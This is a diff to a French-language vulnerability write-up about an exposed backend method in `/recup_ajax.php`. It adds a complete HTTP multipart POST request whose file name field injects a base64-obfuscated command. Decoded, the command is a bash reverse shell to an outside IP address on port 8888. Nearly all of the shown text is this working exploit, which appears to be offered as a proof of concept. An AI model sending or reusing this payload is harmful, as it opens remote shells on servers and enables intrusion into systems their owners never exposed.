@@ -128,6 +128,21 @@ On voit aussi dans la class `Chantier` qu'il existe une méthode `addFichiersEve
 Cette méthode peut être appelé côté client grace à une requête POST sur la route `/recup_ajax.php` en exploitant l'ACL qui permet d'appeler toutes les fonctions backend de ce fichier:
 
 ```
+POST /recup_ajax.php HTTP/1.1
+Host: exemple.com
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxk
+
+------WebKitFormBoundary7MA4YWxk
+Content-Disposition: form-data; name="champ_texte"
+
+Valeur du texte
+------WebKitFormBoundary7MA4YWxk
+Content-Disposition: form-data; name="fichier"; filename="image.png; echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8yMTIuMTI5LjkuMTkvODg4OCAwPiYxJw== | base64 -d | bash"
+Content-Type: image/png
+
+test
+
+------WebKitFormBoundary7MA4YWxk--   
 fonction=addFichiersEvenementChantier&&type=PLAN
 ```
 
